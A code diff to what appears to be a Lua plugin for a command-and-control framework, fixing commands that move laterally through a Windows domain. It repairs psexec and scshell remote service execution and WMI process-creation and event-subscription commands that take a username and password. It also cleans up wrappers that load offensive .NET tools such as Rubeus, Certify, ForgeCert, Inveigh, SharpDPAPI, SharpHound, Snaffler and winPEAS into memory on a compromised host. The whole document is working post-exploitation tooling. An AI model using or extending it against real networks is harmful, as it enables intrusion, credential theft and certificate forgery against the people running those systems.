@@ -101,7 +101,7 @@ local function run_psexec(cmd,args)
     svc_handle:close()
 
     local bof_path = script_resource("domain/Psexec/Psexec."..session.Os.Arch..".o")
-    local pack_args = bof_pack("zzzz",Host,SvcName,SvcBinary,'\\\\' + Host + '\\C$\\Windows\\' + SvcName + ".exe")
+    local pack_args = bof_pack("zzzz",Host,SvcName,SvcBinary,'\\\\'..Host..'\\C$\\Windows\\'..SvcName..".exe")
     return bof(session, bof_path, pack_args, true)
 end
 command( "domain:psexec", run_psexec, "Usage: domain psexec <Host> <Service Name> <Local Path>", "")
@@ -127,7 +127,7 @@ local function run_scshell(cmd,args)
     svc_handle:close()
 
     local bof_path = script_resource("domain/ScShell/ScShell."..session.Os.Arch..".o")
-    local pack_args = bof_pack("zzzz",Host,SvcName,SvcBinary,'\\\\' + Host + '\\C$\\Windows\\' + SvcName + ".exe")
+    local pack_args = bof_pack("zzzz",Host,SvcName,SvcBinary,'\\\\'..Host..'\\C$\\Windows\\'..SvcName..".exe")
     return bof(session, bof_path, pack_args, true)
 end
 command( "domain:scshell", run_scshell, "Usage: domain scshell <Host> <Service Name> <Local Path>", "")
@@ -158,13 +158,13 @@ local function run_wmi_eventsub(cmd,args)
     if #args > 2 and #args < 5 then
         error("Error: Not enough parameters")
     end
-    if #args == 6 then
+    if #args == 5 then
         is_current = 0
-        username = args[4]
-        password = args[5]
-        domain = args[6]
+        username = args[3]
+        password = args[4]
+        domain = args[5]
     end
-    local pack_args = bof_pack("ZZZZi",target,domain,username,password,vbs,is_current)
+    local pack_args = bof_pack("ZZZZZi",target,domain,username,password,vbs,is_current)
     local bof_path = script_resource("domain/Wmi/EventSub/bin/EventSub."..session.Os.Arch..".o")
     return bof(session, bof_path, pack_args, true)
 end
@@ -192,13 +192,13 @@ local function run_wmi_proccreate(cmd,args)
     if #args > 2 and #args < 5 then
         error("Error: Not enough parameters")
     end
-    if #args == 6 then
+    if #args == 5 then
         is_current = 0
-        username = args[4]
-        password = args[5]
-        domain = args[6]
+        username = args[3]
+        password = args[4]
+        domain = args[5]
     end
-    local pack_args = bof_pack("ZZZZi",target,domain,username,password,command,is_current)
+    local pack_args = bof_pack("ZZZZZi",target,domain,username,password,command,is_current)
     local bof_path = script_resource("domain/Wmi/ProcCreate/bin/ProcCreate."..session.Os.Arch..".o")
     return bof(session, bof_path, pack_args, true)
 end
@@ -209,9 +209,7 @@ command( "domain:wmi_proccreate", run_wmi_proccreate, "Usage: domain wmi_proccre
 local function run_ADCSPwn_v1_1(args)
     local session = active()
     local pe_path = script_resource("domain/ADCSPwn/ADCSPwn_v1.1.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:ADCSPwn_v1.1", run_ADCSPwn_v1_1, "Usage: ADCSPwn_v1.1 args", "")
 
@@ -219,9 +217,7 @@ command("domain:ADCSPwn_v1.1", run_ADCSPwn_v1_1, "Usage: ADCSPwn_v1.1 args", "")
 local function run_Certify(args)
     local session = active()
     local pe_path = script_resource("domain/Certify/Certify.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:Certify", run_Certify, "Usage: Certify args", "")
 
@@ -229,9 +225,7 @@ command("domain:Certify", run_Certify, "Usage: Certify args", "")
 local function run_ForgeCert(args)
     local session = active()
     local pe_path = script_resource("domain/ForgeCert/ForgeCert.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:ForgeCert", run_ForgeCert, "Usage: ForgeCert args", "")
 
@@ -239,9 +233,7 @@ command("domain:ForgeCert", run_ForgeCert, "Usage: ForgeCert args", "")
 local function run_Inveigh_NET35(args)
     local session = active()
     local pe_path = script_resource("domain/Inveigh/Inveigh_NET35.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:Inveigh_NET35", run_Inveigh_NET35, "Usage: Inveigh_NET35 args", "")
 
@@ -249,9 +241,7 @@ command("domain:Inveigh_NET35", run_Inveigh_NET35, "Usage: Inveigh_NET35 args", 
 local function run_Inveigh_NET46(args)
     local session = active()
     local pe_path = script_resource("domain/Inveigh/Inveigh_NET46.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:Inveigh_NET46", run_Inveigh_NET46, "Usage: Inveigh_NET46 args", "")
 
@@ -259,9 +249,7 @@ command("domain:Inveigh_NET46", run_Inveigh_NET46, "Usage: Inveigh_NET46 args", 
 local function run_Koh(args)
     local session = active()
     local pe_path = script_resource("domain/Koh/Koh.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:Koh", run_Koh, "Usage: Koh args", "")
 
@@ -269,9 +257,7 @@ command("domain:Koh", run_Koh, "Usage: Koh args", "")
 local function run_MalSCCM(args)
     local session = active()
     local pe_path = script_resource("domain/MalSCCM/MalSCCM.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:MalSCCM", run_MalSCCM, "Usage: MalSCCM args", "")
 
@@ -279,9 +265,7 @@ command("domain:MalSCCM", run_MalSCCM, "Usage: MalSCCM args", "")
 local function run_winPEASx64(args)
     local session = active()
     local pe_path = script_resource("domain/PEASS/winPEASx64.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:winPEASx64", run_winPEASx64, "Usage: winPEASx64 args", "")
 
@@ -289,9 +273,7 @@ command("domain:winPEASx64", run_winPEASx64, "Usage: winPEASx64 args", "")
 local function run_winPEASx86(args)
     local session = active()
     local pe_path = script_resource("domain/PEASS/winPEASx86.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:winPEASx86", run_winPEASx86, "Usage: winPEASx86 args", "")
 
@@ -299,9 +281,7 @@ command("domain:winPEASx86", run_winPEASx86, "Usage: winPEASx86 args", "")
 local function run_Rubeus(args)
     local session = active()
     local pe_path = script_resource("domain/Rubeus/Rubeus.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:Rubeus", run_Rubeus, "Usage: Rubeus args", "")
 
@@ -309,9 +289,7 @@ command("domain:Rubeus", run_Rubeus, "Usage: Rubeus args", "")
 local function run_SharpDPAPI(args)
     local session = active()
     local pe_path = script_resource("domain/SharpDPAPI/SharpDPAPI.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:SharpDPAPI", run_SharpDPAPI, "Usage: SharpDPAPI args", "")
 
@@ -319,9 +297,7 @@ command("domain:SharpDPAPI", run_SharpDPAPI, "Usage: SharpDPAPI args", "")
 local function run_SharpHound_v2_6_3(args)
     local session = active()
     local pe_path = script_resource("domain/SharpHound/SharpHound_v2.6.3.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:SharpHound_v2.6.3", run_SharpHound_v2_6_3, "Usage: SharpHound_v2.6.3 args", "")
 
@@ -329,9 +305,7 @@ command("domain:SharpHound_v2.6.3", run_SharpHound_v2_6_3, "Usage: SharpHound_v2
 local function run_SharpMapExec(args)
     local session = active()
     local pe_path = script_resource("domain/SharpMapExec/SharpMapExec.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:SharpMapExec", run_SharpMapExec, "Usage: SharpMapExec args", "")
 
@@ -339,9 +313,7 @@ command("domain:SharpMapExec", run_SharpMapExec, "Usage: SharpMapExec args", "")
 local function run_Snaffler_v1_0_198(args)
     local session = active()
     local pe_path = script_resource("domain/Snaffler/Snaffler_v1.0.198.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:Snaffler_v1.0.198", run_Snaffler_v1_0_198, "Usage: Snaffler_v1.0.198 args", "")
 
@@ -349,9 +321,7 @@ command("domain:Snaffler_v1.0.198", run_Snaffler_v1_0_198, "Usage: Snaffler_v1.0
 local function run_Spartacus_v2_2_2(args)
     local session = active()
     local pe_path = script_resource("domain/Spartacus/Spartacus_v2.2.2.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:Spartacus_v2.2.2", run_Spartacus_v2_2_2, "Usage: Spartacus_v2.2.2 args", "")
 
@@ -359,9 +329,7 @@ command("domain:Spartacus_v2.2.2", run_Spartacus_v2_2_2, "Usage: Spartacus_v2.2.
 local function run_StandIn_v13_Net35(args)
     local session = active()
     local pe_path = script_resource("domain/Standln/StandIn_v13_Net35.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:StandIn_v13_Net35", run_StandIn_v13_Net35, "Usage: StandIn_v13_Net35 args", "")
 
@@ -369,8 +337,6 @@ command("domain:StandIn_v13_Net35", run_StandIn_v13_Net35, "Usage: StandIn_v13_N
 local function run_StandIn_v13_Net45(args)
     local session = active()
     local pe_path = script_resource("domain/Standln/StandIn_v13_Net45.exe")
-    local arch = session.Os.Arch
-    local sac = new_sac()
-    return execute_assembly(session, pe_path, args, true,new_sac())
+    return execute_assembly(session, pe_path, args, true, new_sac())
 end
 command("domain:StandIn_v13_Net45", run_StandIn_v13_Net45, "Usage: StandIn_v13_Net45 args", "")
